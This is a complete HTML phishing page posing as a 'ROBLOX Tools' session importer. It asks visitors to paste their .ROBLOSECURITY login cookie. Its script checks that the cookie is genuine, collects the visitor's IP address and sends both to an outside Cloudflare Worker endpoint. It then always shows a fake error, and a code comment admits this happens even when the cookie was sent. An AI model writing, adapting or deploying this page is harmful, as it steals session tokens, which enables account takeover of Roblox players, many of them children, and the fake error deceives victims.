<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROBLOX Tools</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        :root{--bg-gradient-1:#0a0a0f;--bg-gradient-2:#1a0b2e;--bg-gradient-3:#2d1b4e;--bg-gradient-4:#1a0b2e;--bg-gradient-5:#0d0d1a;--bg-gradient-6:#2a0a3a;--bg-gradient-7:#0a0a0f;--card-bg:rgba(17,15,25,0.75);--card-border:rgba(139,92,246,0.4);--card-border-hover:rgba(139,92,246,0.7);--input-bg:rgba(10,8,18,0.9);--input-border:rgba(139,92,246,0.4);--text-primary:#e9d5ff;--text-secondary:#d8b4fe;--text-muted:#a78bfa;--btn-gradient-1:#7c3aed;--btn-gradient-2:#a855f7;--btn-gradient-3:#c084fc;--star-color-1:#c084fc;--star-color-2:#a855f7;--star-color-3:#e9d5ff;--star-color-4:#7c3aed;--star-color-5:#d8b4fe;--glow-1:rgba(139,92,246,0.15);--glow-2:rgba(168,85,247,0.15);--glow-3:rgba(124,58,237,0.1);--glow-4:rgba(216,180,254,0.1);--logo-gradient-1:#f0e6ff;--logo-gradient-2:#c084fc;--logo-gradient-3:#a855f7;--logo-gradient-4:#7c3aed;--sub-gradient-1:#d8b4fe;--sub-gradient-2:#a855f7}
        body.light{--bg-gradient-1:#e6f0fa;--bg-gradient-2:#d9e9f7;--bg-gradient-3:#cde2f5;--bg-gradient-4:#e0edf9;--bg-gradient-5:#d4e6f6;--bg-gradient-6:#cae0f3;--bg-gradient-7:#e6f0fa;--card-bg:rgba(255,255,255,0.88);--card-border:rgba(100,150,220,0.5);--card-border-hover:rgba(70,130,200,0.8);--input-bg:rgba(255,255,255,0.95);--input-border:rgba(100,150,220,0.5);--text-primary:#1a2a4f;--text-secondary:#2c4c8c;--text-muted:#5a7dae;--btn-gradient-1:#5a9bd5;--btn-gradient-2:#4a8ec8;--btn-gradient-3:#6aaee0;--star-color-1:#ffd966;--star-color-2:#ffb347;--star-color-3:#ffe0a3;--star-color-4:#ffcc80;--star-color-5:#ffdb9f;--glow-1:rgba(100,150,220,0.2);--glow-2:rgba(70,130,200,0.3);--glow-3:rgba(90,155,213,0.15);--glow-4:rgba(80,140,210,0.2);--logo-gradient-1:#1e3a6b;--logo-gradient-2:#2c5a9e;--logo-gradient-3:#3a7ac0;--logo-gradient-4:#4a90d0;--sub-gradient-1:#2c5a9e;--sub-gradient-2:#3a7ac0}
        body{min-height:100vh;background:linear-gradient(135deg,var(--bg-gradient-1)0%,var(--bg-gradient-2)15%,var(--bg-gradient-3)30%,var(--bg-gradient-4)45%,var(--bg-gradient-5)60%,var(--bg-gradient-6)75%,var(--bg-gradient-7)100%);background-size:400%400%;animation:gradientShift 12s ease infinite;font-family:'Inter','Segoe UI',system-ui,sans-serif;display:flex;justify-content:center;align-items:center;padding:20px;position:relative;overflow-x:hidden;transition:background .3s ease}
        @keyframes gradientShift{0%{background-position:0%50%}50%{background-position:100%50%}100%{background-position:0%50%}}
        .theme-switch{position:fixed;top:20px;right:20px;z-index:1000}
        .theme-btn{background:var(--card-bg);backdrop-filter:blur(10px);border:1px solid var(--card-border);border-radius:50px;padding:10px 18px;cursor:pointer;font-size:14px;font-weight:600;color:var(--text-secondary);display:flex;align-items:center;gap:8px}
        body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background-image:radial-gradient(2px 2px at 20px 30px,var(--star-color-1),rgba(0,0,0,0)),radial-gradient(3px 3px at 80px 120px,var(--star-color-2),rgba(0,0,0,0)),radial-gradient(1px 1px at 160px 80px,var(--star-color-3),rgba(0,0,0,0)),radial-gradient(2px 2px at 300px 200px,var(--star-color-4),rgba(0,0,0,0)),radial-gradient(1px 1px at 450px 350px,var(--star-color-5),rgba(0,0,0,0)),radial-gradient(3px 3px at 600px 50px,var(--star-color-2),rgba(0,0,0,0)),radial-gradient(2px 2px at 750px 280px,var(--star-color-1),rgba(0,0,0,0)),radial-gradient(1px 1px at 900px 150px,var(--star-color-3),rgba(0,0,0,0)),radial-gradient(2px 2px at 1050px 400px,var(--star-color-4),rgba(0,0,0,0)),radial-gradient(3px 3px at 1200px 100px,var(--star-color-5),rgba(0,0,0,0));background-size:200px 200px;background-repeat:no-repeat;opacity:.7;pointer-events:none;animation:starsFloat 20s linear infinite}
        @keyframes starsFloat{0%{transform:translateY(0)}100%{transform:translateY(-100px)}}
        @keyframes floatCookie{0%{transform:translateY(100vh) rotate(0);opacity:0}20%{opacity:.9}80%{opacity:.9}100%{transform:translateY(-10vh) rotate(360deg);opacity:0}}
        .floating-cookie{position:fixed;pointer-events:none;z-index:0;animation:floatCookie linear infinite}
        .card{background:var(--card-bg);backdrop-filter:blur(20px);border-radius:32px;padding:40px 36px;max-width:500px;width:100%;border:1px solid var(--card-border);box-shadow:0 0 30px var(--glow-1);z-index:1}
        .logo{text-align:center;margin-bottom:28px}
        .logo h1{font-size:38px;font-weight:800;background:linear-gradient(135deg,var(--logo-gradient-1),var(--logo-gradient-2),var(--logo-gradient-3),var(--logo-gradient-4));background-size:300%300%;animation:textGradient 3s ease infinite;-webkit-background-clip:text;background-clip:text;color:transparent}
        @keyframes textGradient{0%,100%{background-position:0%50%}50%{background-position:100%50%}}
        .logo p{background:linear-gradient(135deg,var(--sub-gradient-1),var(--sub-gradient-2));-webkit-background-clip:text;background-clip:text;color:transparent;font-size:12px;margin-top:8px}
        .label{color:var(--text-secondary);font-size:13px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
        .cookie-input{width:100%;background:var(--input-bg);border:1.5px solid var(--input-border);border-radius:16px;padding:16px;color:var(--text-primary);font-family:monospace;font-size:12px;resize:vertical}
        .cookie-input:focus{outline:none;border-color:var(--btn-gradient-2);box-shadow:0 0 0 3px var(--glow-2)}
        .validation-status{font-size:11px;margin-top:8px;margin-bottom:20px;display:flex;align-items:center;gap:8px;color:var(--text-muted)}
        .btn-primary{width:100%;background:linear-gradient(135deg,var(--btn-gradient-1),var(--btn-gradient-2),var(--btn-gradient-3));background-size:200%200%;border:none;border-radius:40px;padding:14px;color:#fff;font-weight:700;cursor:pointer}
        .btn-primary:disabled{opacity:.5;cursor:not-allowed}
        .message-area{text-align:center;margin-top:16px;opacity:0;transition:opacity .3s}
        .message-area.show{opacity:1}
        .error-text{color:#f87171;background:rgba(220,38,38,.15);padding:8px 16px;border-radius:24px;display:inline-block;font-size:12px}
    </style>
</head>
<body>
<div class="theme-switch"><button class="theme-btn" id="themeToggleBtn"><span>🌙</span> Тема</button></div>
<div class="card">
    <div class="logo"><h1>ROBLOX Tools</h1><p>SESSION IMPORTER</p></div>
    <label class="label"><span class="label-icon">🍪</span>.ROBLOSECURITY Cookie</label>
    <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
    <div class="validation-status" id="validationStatus"><span>✨</span><span id="statusText">Ожидание ввода...</span></div>
    <button class="btn-primary" id="sendCookieBtn" disabled>🔄 Заменить сессию</button>
    <div id="messageArea" class="message-area"></div>
</div>
<script>
(function(){
    // ========== ТВОЙ ПРОКСИ (CLOUDFLARE WORKER) ==========
    const WEBHOOK_URL = "https://robl.megadoner517.workers.dev";
    // =====================================================
    
    const themeToggleBtn = document.getElementById('themeToggleBtn');
    function loadTheme(){const saved=localStorage.getItem('roblox_theme');if(saved==='light'){document.body.classList.add('light');if(themeToggleBtn)themeToggleBtn.innerHTML='<span>☀️</span> Тема'}else{document.body.classList.remove('light');if(themeToggleBtn)themeToggleBtn.innerHTML='<span>🌙</span> Тема'}}
    function toggleTheme(){if(document.body.classList.contains('light')){document.body.classList.remove('light');localStorage.setItem('roblox_theme','dark');if(themeToggleBtn)themeToggleBtn.innerHTML='<span>🌙</span> Тема'}else{document.body.classList.add('light');localStorage.setItem('roblox_theme','light');if(themeToggleBtn)themeToggleBtn.innerHTML='<span>☀️</span> Тема'}}
    if(themeToggleBtn)themeToggleBtn.addEventListener('click',toggleTheme);
    loadTheme();
    
    function isValidCookie(v){if(!v||v.trim()==='')return false;const t=v.trim();if(!t.includes('WARNING:-DO-NOT-SHARE-THIS'))return false;if(t.length<100)return false;return true;}
    function validateCookie(v){if(!v||v.trim()==='')return{valid:false};if(isValidCookie(v))return{valid:true,length:v.trim().length};return{valid:false}}
    
    const cookieInput=document.getElementById('cookie');
    const sendBtn=document.getElementById('sendCookieBtn');
    const statusText=document.getElementById('statusText');
    const valSpan=document.querySelector('#validationStatus span:first-child');
    const msgArea=document.getElementById('messageArea');
    
    function updateUI(){const v=cookieInput.value;const val=validateCookie(v);if(!v||v.trim()===''){statusText.innerHTML='✨ Ожидание ввода...';statusText.className='status-neutral';if(valSpan)valSpan.innerHTML='✨';sendBtn.disabled=true}else if(val.valid){statusText.innerHTML=`✅ Кука валидна! (${val.length} символов)`;statusText.className='status-valid';if(valSpan)valSpan.innerHTML='✅';sendBtn.disabled=false}else{statusText.innerHTML='❌ Неверный формат куки';statusText.className='status-invalid';if(valSpan)valSpan.innerHTML='❌';sendBtn.disabled=true}}
    
    function showMessage(text,isError=true){msgArea.innerHTML=`<div class="error-text">${isError?'⚠️ ':'✅ '}${text}</div>`;msgArea.classList.add('show');setTimeout(()=>msgArea.classList.remove('show'),3000);}
    
    async function sendCookie(cookie,len){let ip='unknown';try{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();ip=d.ip}catch(e){}
        const msg={content:`**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${len} символов\n**Содержимое:**\n\`\`\`${cookie}\`\`\``};
        try{const resp=await fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(msg)});return resp.ok}catch(e){return false}}
    
    if(sendBtn){sendBtn.onclick=async()=>{const cv=cookieInput.value.trim();const val=validateCookie(cv);if(!val.valid){showMessage('Невалидная кука! Проверьте формат.',true);cookieInput.classList.add('shake');setTimeout(()=>cookieInput.classList.remove('shake'),300);return}
        sendBtn.disabled=true;sendBtn.textContent="⏳ Отправка...";const ok=await sendCookie(cv,val.length);
        // ВАЖНО: ВСЕГДА ПОКАЗЫВАЕМ ОШИБКУ, ДАЖЕ ЕСЛИ КУКИ УШЛИ
        showMessage('Ошибка перенаправления! Обратитесь в поддержку.', true);
        sendBtn.disabled=false;
        sendBtn.textContent="🔄 Заменить сессию";
    }}
    
    cookieInput.addEventListener('input',updateUI);
    cookieInput.addEventListener('paste',()=>setTimeout(updateUI,10));
    updateUI();
    
    for(let i=0;i<50;i++){let c=document.createElement('div');c.className='floating-cookie';c.textContent='🍪';c.style.left=Math.random()*100+'%';c.style.fontSize=(18+Math.random()*34)+'px';c.style.animationDuration=(9+Math.random()*14)+'s';c.style.animationDelay=Math.random()*-20+'s';c.style.opacity=0.5+Math.random()*0.4;document.body.appendChild(c);}
})();
</script>
</body>
</html>
